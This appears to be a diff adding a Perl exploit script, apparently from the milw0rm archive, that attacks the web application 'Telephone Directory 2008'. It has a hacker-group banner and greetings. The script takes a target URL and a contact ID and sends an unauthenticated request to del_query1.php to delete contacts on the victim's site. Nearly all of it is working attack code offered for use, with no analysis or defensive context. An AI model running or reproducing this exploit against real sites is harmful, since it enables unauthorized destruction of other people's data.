@@ -1,0 +1,50 @@
+#!/usr/bin/perl -w
+# Telephone Directory 2008 <=  Arbitrary Delete Contact
+########################################
+#[*] Founded &  Exploited by : Stack
+#[*] Contact: Ev!L =>> see down
+#[*] Greetz : Houssamix & Djekmani & Jadi &  iuoisn & hak3r-b0y All muslims HaCkeRs  :)
+#[*]  Special Thnx To : Simo64  L3azzzzzz khouya
+########################################
+#----------------------------------------------------------------------------#
+########################################
+# * TITLE:          PerlSploit Class
+# * REQUIREMENTS:   PHP 4 / PHP 5
+# * VERSION:        v.1
+# * LICENSE:        GNU General Public License
+# * ORIGINAL URL:   http://www.v4-Team/v4.txt
+# * FILENAME:       PerlSploitClass.pl
+# *
+# * CONTACT:        Wanted  (french / english / arabic / moroco Darija :d )
+# * THNX : AllaH
+# * GREETZ:         Houssamix & Djekmani
+########################################
+#----------------------------------------------------------------------------#
+########################################
+system("color f");
+print "\t\t############################################################\n\n";
+print "\t\t#   Telephone Directory 2008 <=  Arbitrary Delete Contact  #\n\n";
+print "\t\t#                          by Stack                        #\n\n";
+print "\t\t############################################################\n\n";
+########################################
+#----------------------------------------------------------------------------#
+########################################
+use LWP::UserAgent;
+die "Example: perl $0 http://victim.com/path/\n" unless @ARGV;
+print "\n[!] ContactID : ";
+chomp(my $id=<STDIN>);
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$host = $ARGV[0] . "/del_query1.php?id=".$id."";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content;
+if ($answer =~ /Contact(.*?)<br>/){
+        print "\nBrought to you by v4-team.com...\n";
+        print "\n[+] Contact$1\n";}
+  else{print "\n[-] Exploit Failed...\n";}
+  
+########################################
+#-------------------         Exploit exploited by Stack       --------------------#
+########################################
+
+# milw0rm.com [2008-06-09]
